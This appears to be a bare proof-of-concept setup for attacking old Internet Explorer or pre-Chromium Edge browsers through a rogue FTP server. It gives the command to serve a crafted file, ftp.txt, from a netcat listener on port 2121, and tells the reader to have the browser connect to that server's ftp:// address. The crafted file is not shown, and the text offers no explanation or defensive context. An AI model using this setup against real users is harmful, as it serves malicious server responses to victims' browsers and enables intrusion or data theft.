run on your server:
cat ftp.txt - | nc -lvp 2121

connect with ie/edge (pre chromium) to: ftp://server:2121/file